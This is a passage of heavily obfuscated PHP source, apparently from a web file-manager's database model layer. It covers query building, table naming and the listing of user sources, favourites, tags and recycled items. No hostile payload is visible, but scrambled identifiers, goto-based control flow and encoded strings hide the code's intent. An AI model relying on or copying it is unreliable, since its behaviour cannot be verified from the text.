list($bÆ×„„Ù°, $AĞ¨æËÌ‚) = explode($D×…³±î¼—[47], $CÙõİŠù­ï); return $EˆæßïØ¡§ >= $bÆ×„„Ù° && $EˆæßïØ¡§ <= $AĞ¨æËÌ‚; } else { return $EˆæßïØ¡§ == $CÙõİŠù­ï; } case $D×…³±î¼—[337]: list($dœˆë÷š×Í, $eáºõø˜çî) = explode($D×…³±î¼—[47], $CÙõİŠù­ï); if (!is_numeric($dœˆë÷š×Í)) { $dœˆë÷š×Í = strtotime($dœˆë÷š×Í); } if (!is_numeric($eáºõø˜çî)) { $eáºõø˜çî = strtotime($eáºõø˜çî); } return NOW_TIME >= $dœˆë÷š×Í && NOW_TIME <= $eáºõø˜çî; case $D×…³±î¼—[338]: return in_array(get_client_ip(), explode($D×…³±î¼—[47], $CÙõİŠù­ï)); case $D×…³±î¼—[339]: return !in_array(get_client_ip(), explode($D×…³±î¼—[47], $CÙõİŠù­ï)); case $D×…³±î¼—[326]: default: return $this->regex($c‡ŠÆĞŞÂ, $CÙõİŠù­ï); } } public function query($EÜÙî¶Ü¡ª, $fÔàÏÁàŒ¸ = false) { $C£†§­¶Ş‚ =& $_SERVER[æ§›¦ÌáØ]; if (!is_bool($fÔàÏÁàŒ¸) && !is_array($fÔàÏÁàŒ¸)) { $fÔàÏÁàŒ¸ = func_get_args(); array_shift($fÔàÏÁàŒ¸); } $EÜÙî¶Ü¡ª = str_replace(array($C£†§­¶Ş‚[229], $C£†§­¶Ş‚[340]), $C£†§­¶Ş‚[50], $EÜÙî¶Ü¡ª); $EÜÙî¶Ü¡ª = $this->parseSql($EÜÙî¶Ü¡ª, $fÔàÏÁàŒ¸); return $this->db->query($EÜÙî¶Ü¡ª); } public function execute($Eíñ†¹‘¬Ç, $Aƒ†ùˆ«–› = false) { if (!is_bool($Aƒ†ùˆ«–›) && !is_array($Aƒ†ùˆ«–›)) { $Aƒ†ùˆ«–› = func_get_args(); array_shift($Aƒ†ùˆ«–›); } $Eíñ†¹‘¬Ç = $this->parseSql($Eíñ†¹‘¬Ç, $Aƒ†ùˆ«–›); return $this->db->execute($Eíñ†¹‘¬Ç); } protected function parseSql($c±‰®ô‚Îà, $a¡Ü·ÀÜ’) { $aÛƒíñ©Ëö =& $_SERVER[æ§›¦ÌáØ]; if (!0 === $a¡Ü·ÀÜ’) { $cãŞ™ÇÂÙç = $this->_parseOptions(); $c±‰®ô‚Îà = $this->db->parseSql($c±‰®ô‚Îà, $cãŞ™ÇÂÙç); } elseif (is_array($a¡Ü·ÀÜ’)) { $a¡Ü·ÀÜ’ = array_map(array($this->db, $aÛƒíñ©Ëö[341]), $a¡Ü·ÀÜ’); $c±‰®ô‚Îà = vsprintf($c±‰®ô‚Îà, $a¡Ü·ÀÜ’); } else { $c±‰®ô‚Îà = strtr($c±‰®ô‚Îà, array($aÛƒíñ©Ëö[342] => $this->getTableName(), $aÛƒíñ©Ëö[343] => think_config($aÛƒíñ©Ëö[242]))); } $this->db->setModel($this->name); return $c±‰®ô‚Îà; } public function db($dÅÌòîòŸ = '', $A›©öÌ™ä = '', $Fñ×¼Ì”‚ = array()) { goto AÙé‹ïÁ«; AÙé‹ïÁ«: $e¦ÛÌ®à =& $_SERVER[æ§›¦ÌáØ]; if ($e¦ÛÌ®à[33] === $dÅÌòîòŸ && $this->db) { return $this->db; } static $e‹·¼¢ó‘× = array(); goto C–ƒ±·™£; C†è™ŠË½: $e‹·¼¢ó‘×[$dÅÌòîòŸ] = $A›©öÌ™ä; $this->db = $DØÄñ³Õ§™[$dÅÌòîòŸ]; $this->_after_db(); goto bœï¶ôÒ¯; C–ƒ±·™£: static $DØÄñ³Õ§™ = array(); if (!isset($DØÄñ³Õ§™[$dÅÌòîòŸ]) || isset($DØÄñ³Õ§™[$dÅÌòîòŸ]) && $A›©öÌ™ä && $e‹·¼¢ó‘×[$dÅÌòîòŸ] != $A›©öÌ™ä) { if (!empty($A›©öÌ™ä) && is_string($A›©öÌ™ä) && !1 === strpos($A›©öÌ™ä, $e¦ÛÌ®à[8])) { $A›©öÌ™ä = think_config($A›©öÌ™ä); } $DØÄñ³Õ§™[$dÅÌòîòŸ] = Db::getInstance($A›©öÌ™ä); } elseif (NULL === $A›©öÌ™ä) { $DØÄñ³Õ§™[$dÅÌòîòŸ]->close(); unset($DØÄñ³Õ§™[$dÅÌòîòŸ]); return; } if (!empty($Fñ×¼Ì”‚)) { if (is_string($Fñ×¼Ì”‚)) { parse_str($Fñ×¼Ì”‚, $Fñ×¼Ì”‚); } foreach ($Fñ×¼Ì”‚ as $e¹Ş™ö“Å× => $a¯¼ç‡÷¹‹) { $this->setProperty($e¹Ş™ö“Å×, $a¯¼ç‡÷¹‹); } } goto C†è™ŠË½; bœï¶ôÒ¯: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto Dã¯¡Œ¾Í”; Dã¯¡Œ¾Í”: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $D†­µŒİ‹ = get_class($this); if ($D†­µŒİ‹ == $_SERVER[æ§›¦ÌáØ][344]) { return $this->name; } $this->name = substr($D†­µŒİ‹, 0, -5); } return $this->name; } public function getTableName() { $BíïŒéØƒº =& $_SERVER[æ§›¦ÌáØ]; if (empty($this->trueTableName)) { $E“„ğÁŸ†ö = !empty($this->tablePrefix) ? $this->tablePrefix : $BíïŒéØƒº[33]; if (!empty($this->tableName)) { $E“„ğÁŸ†ö .= $this->tableName; } else { $E“„ğÁŸ†ö .= think_parse_name($this->name); } $this->trueTableName = strtolower($E“„ğÁŸ†ö); } return (!empty($this->dbName) ? $this->dbName . $BíïŒéØƒº[95] : $BíïŒéØƒº[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $C†…î‚µÉß =& $_SERVER[æ§›¦ÌáØ]; return isset($this->fields[$C†…î‚µÉß[249]]) ? $this->fields[$C†…î‚µÉß[249]] : $this->pk; } public function getDbFields() { $A§œ—’ó½ =& $_SERVER[æ§›¦ÌáØ]; if (isset($this->options[$A§œ—’ó½[277]])) { $EÛˆÚÅª = $this->db->getFields($this->options[$A§œ—’ó½[277]]); return $EÛˆÚÅª ? array_keys($EÛˆÚÅª) : !1; } if ($this->fields) { $EÛˆÚÅª = $this->fields; unset($EÛˆÚÅª[$A§œ—’ó½[248]], $EÛˆÚÅª[$A§œ—’ó½[249]], $EÛˆÚÅª[$A§œ—’ó½[250]], $EÛˆÚÅª[$A§œ—’ó½[247]]); return $EÛˆÚÅª; } return !1; } public function data($f¸å§ôºÈ… = '') { $c´‚·½„å =& $_SERVER[æ§›¦ÌáØ]; if ($c´‚·½„å[33] === $f¸å§ôºÈ… && !empty($this->data)) { return $this->data; } if (is_object($f¸å§ôºÈ…)) { $f¸å§ôºÈ… = get_object_vars($f¸å§ôºÈ…); } elseif (is_string($f¸å§ôºÈ…)) { parse_str($f¸å§ôºÈ…, $f¸å§ôºÈ…); } elseif (!is_array($f¸å§ôºÈ…)) { think_exception(think_lang($c´‚·½„å[269])); } $this->data = $f¸å§ôºÈ…; return $this; } public function join($A˜¡®á¨à¹) { $a¼ÊœÍÉ¾² =& $_SERVER[æ§›¦ÌáØ]; if (is_array($A˜¡®á¨à¹)) { $this->options[$a¼ÊœÍÉ¾²[280]] = $A˜¡®á¨à¹; } elseif (!empty($A˜¡®á¨à¹)) { $this->options[$a¼ÊœÍÉ¾²[280]][] = $A˜¡®á¨à¹; } return $this; } public function union($cŸêñ§×À­, $F”¨š¸—ÂÆ = false) { goto Eößñ“Øö×; bÇ…æ°…ô: if (is_object($cŸêñ§×À­)) { $cŸêñ§×À­ = get_object_vars($cŸêñ§×À­); } if (is_string($cŸêñ§×À­)) { $Cœ–åë¾Ó = $cŸêñ§×À­; } elseif (is_array($cŸêñ§×À­)) { if (isset($cŸêñ§×À­[0])) { $this->options[$C†¬ƒÓÔ²‰[345]] = array_merge($this->options[$C†¬ƒÓÔ²‰[345]], $cŸêñ§×À­); return $this; } else { $Cœ–åë¾Ó = $cŸêñ§×À­; } } else { think_exception(think_lang($C†¬ƒÓÔ²‰[269])); } $this->options[$C†¬ƒÓÔ²‰[345]][] = $Cœ–åë¾Ó; goto aÁ›ù´ŒËÎ; Eößñ“Øö×: $C†¬ƒÓÔ²‰ =& $_SERVER[æ§›¦ÌáØ]; if (empty($cŸêñ§×À­)) { return $this; } if ($F”¨š¸—ÂÆ) { $this->options[$C†¬ƒÓÔ²‰[345]][$C†¬ƒÓÔ²‰[346]] = !0; } goto bÇ…æ°…ô; aÁ›ù´ŒËÎ: return $this; goto böÅÒ‹·”¼; böÅÒ‹·”¼: } public function cache($Bë§‹ˆ¤Õ© = true, $cÍ¼¸æ† = null, $F™İÈĞÃÛ‹ = '') { $D·Ñ„„ÖŒ =& $_SERVER[æ§›¦ÌáØ]; if (!1 !== $Bë§‹ˆ¤Õ©) { $this->options[$D·Ñ„„ÖŒ[347]] = array($D·Ñ„„ÖŒ[93] => $Bë§‹ˆ¤Õ©, $D·Ñ„„ÖŒ[337] => $cÍ¼¸æ†, $D·Ñ„„ÖŒ[29] => $F™İÈĞÃÛ‹); } return $this; } public function field($CÍŒÕöŞŸ¬, $d–¦Ë°°Å‚ = false) { $B»šöœ‹¢™ =& $_SERVER[æ§›¦ÌáØ]; if (!0 === $CÍŒÕöŞŸ¬) { $FŠƒã‰Ã = $this->getDbFields(); $CÍŒÕöŞŸ¬ = $FŠƒã‰Ã ? $FŠƒã‰Ã : $B»šöœ‹¢™[182]; } elseif ($d–¦Ë°°Å‚) { if (is_string($CÍŒÕöŞŸ¬)) { $CÍŒÕöŞŸ¬ = explode($B»šöœ‹¢™[47], $CÍŒÕöŞŸ¬); } $FŠƒã‰Ã = $this->getDbFields(); $CÍŒÕöŞŸ¬ = $FŠƒã‰Ã ? array_diff($FŠƒã‰Ã, $CÍŒÕöŞŸ¬) : $CÍŒÕöŞŸ¬; } $this->options[$B»šöœ‹¢™[271]] = $CÍŒÕöŞŸ¬; return $this; } public function scope($E§£…ÀÔ©ö = '', $cÌ«Å–Ìäº = NULL) { $b×É†¸ÆŞœ =& $_SERVER[æ§›¦ÌáØ]; if ($b×É†¸ÆŞœ[33] === $E§£…ÀÔ©ö) { if (isset($this->_scope[$b×É†¸ÆŞœ[34]])) { $e‘î»¿š÷ = $this->_scope[$b×É†¸ÆŞœ[34]]; } else { return $this; } } elseif (is_string($E§£…ÀÔ©ö)) { $fë³‘‘ç¯– = explode($b×É†¸ÆŞœ[47], $E§£…ÀÔ©ö); $e‘î»¿š÷ = array(); foreach ($fë³‘‘ç¯– as $eº¿®‹ã–±) { if (!isset($this->_scope[$eº¿®‹ã–±])) { continue; } $e‘î»¿š÷ = array_merge($e‘î»¿š÷, $this->_scope[$eº¿®‹ã–±]); } if (!empty($cÌ«Å–Ìäº) && is_array($cÌ«Å–Ìäº)) { $e‘î»¿š÷ = array_merge($e‘î»¿š÷, $cÌ«Å–Ìäº); } } elseif (is_array($E§£…ÀÔ©ö)) { $e‘î»¿š÷ = $E§£…ÀÔ©ö; } if (is_array($e‘î»¿š÷) && !empty($e‘î»¿š÷)) { $this->options = array_merge($this->options, array_change_key_case($e‘î»¿š÷)); } return $this; } public function where($FéÎ±°¶, $FÓ¦ÚîÒŒÔ = null) { $Aµ‰œ¾„ÖÀ =& $_SERVER[æ§›¦ÌáØ]; if (!is_null($FÓ¦ÚîÒŒÔ) && is_string($FéÎ±°¶)) { if (!is_array($FÓ¦ÚîÒŒÔ)) { $FÓ¦ÚîÒŒÔ = func_get_args(); array_shift($FÓ¦ÚîÒŒÔ); } $FÓ¦ÚîÒŒÔ = array_map(array($this->db, $Aµ‰œ¾„ÖÀ[341]), $FÓ¦ÚîÒŒÔ); $FéÎ±°¶ = vsprintf($FéÎ±°¶, $FÓ¦ÚîÒŒÔ); } elseif (is_object($FéÎ±°¶)) { $FéÎ±°¶ = get_object_vars($FéÎ±°¶); } elseif (is_array($FéÎ±°¶)) { foreach ($FéÎ±°¶ as $eÛåÎÖ¹´Ì => $FóÚ¯Ï™œ) { if ((is_numeric($eÛåÎÖ¹´Ì) || !$eÛåÎÖ¹´Ì) && is_string($FóÚ¯Ï™œ)) { if (strpos($FóÚ¯Ï™œ, $Aµ‰œ¾„ÖÀ[348]) === 0) { continue; } think_trace($Aµ‰œ¾„ÖÀ[349], $Aµ‰œ¾„ÖÀ[33], $Aµ‰œ¾„ÖÀ[46]); die; } } } if (is_string($FéÎ±°¶) && $Aµ‰œ¾„ÖÀ[33] != $FéÎ±°¶) { $bö„¤ºÂ‡‹ = array(); $bö„¤ºÂ‡‹[$Aµ‰œ¾„ÖÀ[350]] = $FéÎ±°¶; $FéÎ±°¶ = $bö„¤ºÂ‡‹; } if (isset($this->options[$Aµ‰œ¾„ÖÀ[273]])) { $this->options[$Aµ‰œ¾„ÖÀ[273]] = array_merge($this->options[$Aµ‰œ¾„ÖÀ[273]], $FéÎ±°¶); } else { $this->options[$Aµ‰œ¾„ÖÀ[273]] = $FéÎ±°¶; } return $this; } public function limit($a‹‰ğ¹ìÔØ, $b›Í‘ôŠ½ê = null) { $EÛ±°·µ«Ô =& $_SERVER[æ§›¦ÌáØ]; $this->options[$EÛ±°·µ«Ô[290]] = is_null($b›Í‘ôŠ½ê) ? $a‹‰ğ¹ìÔØ : $a‹‰ğ¹ìÔØ . $EÛ±°·µ«Ô[47] . $b›Í‘ôŠ½ê; return $this; } public function page($Bùï„×İ, $FÙãÔÒÌ¥· = null) { $b »‡è©´Ç =& $_SERVER[æ§›¦ÌáØ]; $this->options[$b »‡è©´Ç[351]] = is_null($FÙãÔÒÌ¥·) ? $Bùï„×İ : $Bùï„×İ . $b »‡è©´Ç[47] . $FÙãÔÒÌ¥·; return $this; } public function comment($BÚÄ˜Ù»‚») { $this->options[$_SERVER[æ§›¦ÌáØ][352]] = $BÚÄ˜Ù»‚»; return $this; } public function setProperty($dôòãäÏ±ƒ, $böëôâªñ) { if (property_exists($this, $dôòãäÏ±ƒ)) { $this->{$dôòãäÏ±ƒ} = $böëôâªñ; } return $this; } } goto bÇïó¯áÊ; F´çó­Š‘Ï: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\x63\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\155\145" => "\151\157\137\163\157\x75\162\x63\145\x5f\x6d\x65\x74\x61", "\x6d\x65\x74\x61\x46\x69\x65\x6c\144" => "\x73\x6f\165\x72\143\145\x49\104"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\x65\162\x74", "\146\165\156\x63\164\x69\x6f\156"), array("\x63\x72\145\x61\x74\x65\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\156\x73\145\162\x74", "\x66\x75\x6e\143\164\x69\157\156"), array("\166\151\x65\167\124\x69\x6d\145", "\x74\x69\x6d\145", "\x69\156\x73\145\162\164", "\x66\x75\x6e\143\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($d‚„ö Ú“ª) { return $this->listSource(array($_SERVER[æ§›¦ÌáØ][394] => $d‚„ö Ú“ª)); } public function typeName($E¥øäÍÖ) { static $e¢¼—ƒ³§ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\x65\x6d", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\147\x72\157\165\160"); return $e¢¼—ƒ³§[$E¥øäÍÖ . $_SERVER[æ§›¦ÌáØ][33]]; } public function sourceListInfo($d¬ÑÇ¤½Ê•, $c‹Ÿç’¾ÍÏ = false) { goto aÍÈğÈñÃ; aÍÈğÈñÃ: $aê«Á‚‘‘ç =& $_SERVER[æ§›¦ÌáØ]; $d¬ÑÇ¤½Ê• = $d¬ÑÇ¤½Ê• ? $d¬ÑÇ¤½Ê• : array(); $d¬ÑÇ¤½Ê• = array_filter(array_unique($d¬ÑÇ¤½Ê•)); goto cÓñ«®Ö¢”; cÓñ«®Ö¢”: if (!$d¬ÑÇ¤½Ê•) { return array(); } $aâ’—ê†¬Ó = $this->where(array($aê«Á‚‘‘ç[395] => array($aê«Á‚‘‘ç[7], $d¬ÑÇ¤½Ê•)))->select(); $this->_listDataApply($aâ’—ê†¬Ó, $c‹Ÿç’¾ÍÏ); goto aãŒÜÔëÜ; aãŒÜÔëÜ: return array_to_keyvalue($aâ’—ê†¬Ó, $aê«Á‚‘‘ç[395]); goto dØÉİëÑÇ½; dØÉİëÑÇ½: } public function pathInfoFilter(&$cë“§±±ùà) { goto cÏÂ’‚Üƒ¤; a»‹ƒÍß„: if ($cë“§±±ùà[$Aƒæ“Ôå”Í[403]] != 1) { $cë“§±±ùà[$Aƒæ“Ôå”Í[168]] = $cë“§±±ùà[$Aƒæ“Ôå”Í[405]]; unset($cë“§±±ùà[$Aƒæ“Ôå”Í[405]]); } $aîÜÕï®¿ = $D§³Ì’÷õ; if (isset($cë“§±±ùà[$Aƒæ“Ôå”Í[406]]) && $cë“§±±ùà[$Aƒæ“Ôå”Í[406]][$Aƒæ“Ôå”Í[407]] == -1) { $aîÜÕï®¿ = $C¶ƒ§‡ŸŒ; } goto AŒ¡ï¦™éÁ; e®ÅŒ–õä: static $DßÛèŠÈ¼ = false; if (!$D§³Ì’÷õ) { goto Bˆó†Ô…Ï˜; Bˆó†Ô…Ï˜: $A¦ãèŸŒ© = $Aƒæ“Ôå”Í[396]; $A¦ãèŸŒ© .= $Aƒæ“Ôå”Í[397]; $A¦ãèŸŒ© .= $Aƒæ“Ôå”Í[398]; goto eÓŠ’ñÂ’¦; cŠ‡º÷ÔÍâ: $C¶ƒ§‡ŸŒ = array(); foreach ($D§³Ì’÷õ as $dªéÔ‘ª¬) { if (in_array($dªéÔ‘ª¬, $D‚éÆ¤âÜ)) { continue; } $C¶ƒ§‡ŸŒ[] = $dªéÔ‘ª¬; } $DßÛèŠÈ¼ = explode($Aƒæ“Ôå”Í[47], $Aƒæ“Ôå”Í[400]); goto f³½ˆÇÒÇ; eÓŠ’ñÂ’¦: $aèİ¥Ñ£å† = $Aƒæ“Ôå”Í[399]; $D‚éÆ¤âÜ = explode($Aƒæ“Ôå”Í[47], $aèİ¥Ñ£å†); $D§³Ì’÷õ = explode($Aƒæ“Ôå”Í[47], $A¦ãèŸŒ©); goto cŠ‡º÷ÔÍâ; f³½ˆÇÒÇ: } foreach ($DßÛèŠÈ¼ as $cÓÄöÌÉ¼ä) { if (isset($cë“§±±ùà[$cÓÄöÌÉ¼ä])) { $cë“§±±ùà[$cÓÄöÌÉ¼ä] = intval($cë“§±±ùà[$cÓÄöÌÉ¼ä]); } } goto DŒä­ºÁš; DŒä­ºÁš: $cë“§±±ùà[$Aƒæ“Ôå”Í[76]] = $Aƒæ“Ôå”Í[401] . $cë“§±±ùà[$Aƒæ“Ôå”Í[395]] . $Aƒæ“Ôå”Í[402]; $cë“§±±ùà[$Aƒæ“Ôå”Í[29]] = $cë“§±±ùà[$Aƒæ“Ôå”Í[403]] == 1 ? $Aƒæ“Ôå”Í[77] : $Aƒæ“Ôå”Í[193]; $cë“§±±ùà[$Aƒæ“Ôå”Í[404]] = $this->typeName($cë“§±±ùà[$Aƒæ“Ôå”Í[404]]); goto a»‹ƒÍß„; AŒ¡ï¦™éÁ: $cë“§±±ùà = array_field_key($cë“§±±ùà, $aîÜÕï®¿); return $cë“§±±ùà; goto dİ¬šÓÛ—; cÏÂ’‚Üƒ¤: $Aƒæ“Ôå”Í =& $_SERVER[æ§›¦ÌáØ]; static $D§³Ì’÷õ = false; static $C¶ƒ§‡ŸŒ = false; goto e®ÅŒ–õä; dİ¬šÓÛ—: } public function listUserFav() { goto E—µ‚íÚÚ; fŸê‹ŸèÑ“: $E™ôØ´Å‡® = array_to_keyvalue($E™ôØ´Å‡®, $D‡çã±ºÕá[33], $D‡çã±ºÕá[76]); if ($E™ôØ´Å‡®) { $FØŒ‡ÇÓ = $this->listSource(array($D‡çã±ºÕá[410] => array($D‡çã±ºÕá[411], $E™ôØ´Å‡®))); } $FØŒ‡ÇÓ = array_to_keyvalue($FØŒ‡ÇÓ[$D‡çã±ºÕá[367]], $D‡çã±ºÕá[395]); goto aéİ§œ„‚Ô; E—µ‚íÚÚ: $D‡çã±ºÕá =& $_SERVER[æ§›¦ÌáØ]; $Eë¤Ù²àçÔ = Model($D‡çã±ºÕá[408])->listData(); $E™ôØ´Å‡® = array_filter_by_field($Eë¤Ù²àçÔ, $D‡çã±ºÕá[29], $D‡çã±ºÕá[409]); goto fŸê‹ŸèÑ“; aéİ§œ„‚Ô: foreach ($Eë¤Ù²àçÔ as &$D”“êê×…) { $D”“êê×… = array($D‡çã±ºÕá[412] => $D”“êê×…[$D‡çã±ºÕá[393]], $D‡çã±ºÕá[413] => $D”“êê×…[$D‡çã±ºÕá[28]], $D‡çã±ºÕá[414] => $D”“êê×…[$D‡çã±ºÕá[76]], $D‡çã±ºÕá[415] => $D”“êê×…[$D‡çã±ºÕá[29]], $D‡çã±ºÕá[416] => $D”“êê×…[$D‡çã±ºÕá[194]], $D‡çã±ºÕá[417] => $D”“êê×…[$D‡çã±ºÕá[84]]); if ($D”“êê×…[$D‡çã±ºÕá[29]] == $D‡çã±ºÕá[409] && $FØŒ‡ÇÓ[$D”“êê×…[$D‡çã±ºÕá[76]]]) { $D”“êê×…[$D‡çã±ºÕá[85]] = $FØŒ‡ÇÓ[$D”“êê×…[$D‡çã±ºÕá[76]]]; } } unset($D”“êê×…); return $Eë¤Ù²àçÔ; goto Fñ²Ò‡‹À²; Fñ²Ò‡‹À²: } public function listUserTag($B¨§Ú°¢„´) { goto E™°Ò‡£âÈ; bŸ‹Ú¢ŞÊ: if ($B¢ùùŸƒõµ) { Model($Fƒˆ¢öÙ¤[420])->removeBySource($B¢ùùŸƒõµ); } return $e±ö±»©ª; goto bŞõñìòÎ’; E™°Ò‡£âÈ: $Fƒˆ¢öÙ¤ =& $_SERVER[æ§›¦ÌáØ]; if ($B¨§Ú°¢„´ && !is_array($B¨§Ú°¢„´)) { $B¨§Ú°¢„´ = array($B¨§Ú°¢„´); } $e…Š²ç”Ï = Model($Fƒˆ¢öÙ¤[418])->listData(); goto fšÅø˜î½È; añ…óåªêÃ: foreach ($cÍ¼™³Á’» as $DøŸ‰²ŠĞ– => $E£Í†Ù´õ) { $E³¡ğ®‹¤ = !0; if (!$B¨§Ú°¢„´) { $BŒôÛˆÃÌ[] = $DøŸ‰²ŠĞ–; continue; } foreach ($B¨§Ú°¢„´ as $bÏíã·ìÎº) { if (!in_array($bÏíã·ìÎº, $E£Í†Ù´õ)) { $E³¡ğ®‹¤ = !1; break; } } if ($E³¡ğ®‹¤) { $BŒôÛˆÃÌ[] = $DøŸ‰²ŠĞ–; } } if (!$BŒôÛˆÃÌ) { return array(); } $e±ö±»©ª = $this->listSource(array($Fƒˆ¢öÙ¤[410] => array($Fƒˆ¢öÙ¤[411], $BŒôÛˆÃÌ))); goto a®ØÚàô²; fšÅø˜î½È: $cÍ¼™³Á’» = array(); foreach ($e…Š²ç”Ï as $EÉ¬ª¼¢÷„) { $eÙ¼Ù‡´£· = $EÉ¬ª¼¢÷„[$Fƒˆ¢öÙ¤[76]]; if (!$eÙ¼Ù‡´£·) { continue; } if (!isset($cÍ¼™³Á’»[$eÙ¼Ù‡´£·])) { $cÍ¼™³Á’»[$eÙ¼Ù‡´£·] = array(); } $cÍ¼™³Á’»[$eÙ¼Ù‡´£·][] = $EÉ¬ª¼¢÷„[$Fƒˆ¢öÙ¤[419]]; } $BŒôÛˆÃÌ = array(); goto añ…óåªêÃ; d‘›­Û¢…£: $DÊğÒ¡ê– = array_to_keyvalue($e±ö±»©ª[$Fƒˆ¢öÙ¤[74]], $Fƒˆ¢öÙ¤[33], $Fƒˆ¢öÙ¤[395]); $FãÃ¯Ï‚ß» = array_merge($DÊğÒ¡ê–, $f…«ˆªÂ²”); foreach ($BŒôÛˆÃÌ as $eÙ¼Ù‡´£·) { if (!in_array($eÙ¼Ù‡´£·, $FãÃ¯Ï‚ß»)) { $B¢ùùŸƒõµ[] = $eÙ¼Ù‡´£·; } } goto bŸ‹Ú¢ŞÊ; a®ØÚàô²: if (!$e±ö±»©ª || count($BŒôÛˆÃÌ) == $e±ö±»©ª[$Fƒˆ¢öÙ¤[364]][$Fƒˆ¢öÙ¤[365]]) { return $e±ö±»©ª; } $B¢ùùŸƒõµ = array(); $f…«ˆªÂ²” = array_to_keyvalue($e±ö±»©ª[$Fƒˆ¢öÙ¤[75]], $Fƒˆ¢öÙ¤[33], $Fƒˆ¢öÙ¤[395]); goto d‘›­Û¢…£; bŞõñìòÎ’: } public function listUserRecycle() { $eùœ‘–Å‹ =& $_SERVER[æ§›¦ÌáØ]; $A¦ƒ„”Ï ç = Model($eùœ‘–Å‹[421])->listData(); if (!$A¦ƒ„”Ï ç) { return array(); } $F™¦Ş†«çÇ = array($eùœ‘–Å‹[410] => array($eùœ‘–Å‹[411], $A¦ƒ„”Ï ç), $eùœ‘–Å‹[422] => 1); return $this->listSource($F™¦Ş†«çÇ); } public function listSource($e¹¬öÑÃ° , $DèŠŒ™–‡‰ = 3000) { goto bİ’Íİ¢…’; a‘˜¶Æè¸²: return $A×Š¤Ì˜Ì±; goto eÜ†®ÃÊæ±; bİ’Íİ¢…’: $b¶Ì·Âà¼ƒ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($e¹¬öÑÃ° [$b¶Ì·Âà¼ƒ[423]])) { $e¹¬öÑÃ° [$b¶Ì·Âà¼ƒ[423]] = 0; } $c·¹µÏÊäù = $b¶Ì·Âà¼ƒ[424]; goto ešˆ†œ·­; ešˆ†œ·­: $A×Š¤Ì˜Ì± = $this->field($c·¹µÏÊäù)->_makeOrder()->where($e¹¬öÑÃ° )->selectPage($DèŠŒ™–‡‰); $this->_listDataApply($A×Š¤Ì˜Ì±[$b¶Ì·Âà¼ƒ[367]]); $this->_listMake($A×Š¤Ì˜Ì±); goto a‘˜¶Æè¸²; eÜ†®ÃÊæ±: } protected function _makeOrder() { goto aÀùË¡á¸; fÚÑ¸©Àù°: $B¹‘òíŒÙ = Input::get($D¸ô¢º‹©–[436], $D¸ô¢º‹©–[7], $BéŒåËÅËÕ, array_keys($CÍ§êàÔ·Û)); if (!in_array($D÷Ñ®é«–ô, array_keys($aŸ‰Ïô¬Ö))) { $D÷Ñ®é«–ô = $D¸ô¢º‹©–[28]; } if (!in_array($B¹‘òíŒÙ, array_keys($CÍ§êàÔ·Û))) { $D÷Ñ®é«–ô = $D¸ô¢º‹©–[428]; } goto bÈ¸Õ‡ßº; eã±¨ÙÕÉ: $CÍ§êàÔ·Û = array($D¸ô¢º‹©–[428] => $D¸ô¢º‹©–[429], $D¸ô¢º‹©–[430] => $D¸ô¢º‹©–[431]); $aŸ‰Ïô¬Ö = array($D¸ô¢º‹©–[28] => $D¸ô¢º‹©–[28], $D¸ô¢º‹©–[78] => $D¸ô¢º‹©–[78], $D¸ô¢º‹©–[168] => $D¸ô¢º‹©–[405], $D¸ô¢º‹©–[432] => $D¸ô¢º‹©–[432], $D¸ô¢º‹©–[433] => $D¸ô¢º‹©–[434], $D¸ô¢º‹©–[194] => $D¸ô¢º‹©–[194], $D¸ô¢º‹©–[84] => $D¸ô¢º‹©–[84]); $D÷Ñ®é«–ô = Input::get($D¸ô¢º‹©–[435], $D¸ô¢º‹©–[7], $C¡ùñ‹“ô, array_keys($aŸ‰Ïô¬Ö)); goto fÚÑ¸©Àù°; aÀùË¡á¸: $D¸ô¢º‹©– =& $_SERVER[æ§›¦ÌáØ]; $C¡ùñ‹“ô = Model($D¸ô¢º‹©–[425])->get($D¸ô¢º‹©–[426]); $BéŒåËÅËÕ = Model($D¸ô¢º‹©–[425])->get($D¸ô¢º‹©–[427]); goto eã±¨ÙÕÉ; bÈ¸Õ‡ßº: if ($D÷Ñ®é«–ô == $D¸ô¢º‹©–[28]) { } $dßËàÚ±ğ = $D¸ô¢º‹©–[437] . $aŸ‰Ïô¬Ö[$D÷Ñ®é«–ô] . $D¸ô¢º‹©–[50] . $CÍ§êàÔ·Û[$B¹‘òíŒÙ]; return $this->order(rtrim(trim($dßËàÚ±ğ), $D¸ô¢º‹©–[47])); goto e’‹ğĞĞÈÄ; e’‹ğĞĞÈÄ: } protected function _listDataApplyItem($AÑƒÊÔ®É, $B†ãºöî‰† = false) { $C­›¡Õö = array($AÑƒÊÔ®É); $this->_listDataApply($C­›¡Õö, $B†ãºöî‰†); return $C­›¡Õö[0]; } protected function _listDataApply(&$E³ÎÔäê‹Ÿ, $DÕ•óº¶Üä = false) { goto d¯¨‹¶è´; a‰‹æ¶ÔÊ„: $this->_listAppendUser($E³ÎÔäê‹Ÿ); $this->_listFilterInfo($E³ÎÔäê‹Ÿ, $DÕ•óº¶Üä); $this->_listAppendAuthSecret($E³ÎÔäê‹Ÿ); goto b—íËŠ°ª; DŞÁ×– Ü: $E÷×·ó¬‹Ì = array_unique($E÷×·ó¬‹Ì); $this->_listSourceCache($E³ÎÔäê‹Ÿ); if (!$DÕ•óº¶Üä) { $this->_listAppendMeta($E³ÎÔäê‹Ÿ, $E÷×·ó¬‹Ì); $this->_listAppendFileMeta($E³ÎÔäê‹Ÿ, 